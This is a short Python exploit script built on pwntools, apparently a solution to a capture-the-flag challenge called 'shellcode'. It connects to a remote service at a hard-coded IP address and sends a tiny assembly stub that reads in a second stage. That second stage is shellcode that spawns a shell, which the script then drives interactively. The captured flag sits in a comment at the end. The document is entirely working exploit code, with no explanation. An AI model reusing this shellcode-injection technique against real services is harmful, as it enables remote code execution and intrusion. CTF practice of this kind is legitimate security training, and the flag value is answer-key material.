from pwn import *

#p = process('./shellcode')
p = remote('34.92.37.22',10002)
context.arch = 'amd64'
context.os = 'Linux'

p.recvuntil('give me shellcode, plz:\n')

payload = asm('''
                 pop rdx
                 pop rdx
                 pop rdx
                 pop rdx
                 pop rdi
                 pop rdi
                 syscall
              '''
             )

p.sendline(payload)

payload2 = asm(shellcraft.sh())
#gdb.attach(p)
p.sendline('A'*len(payload) + payload2)

p.interactive()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}
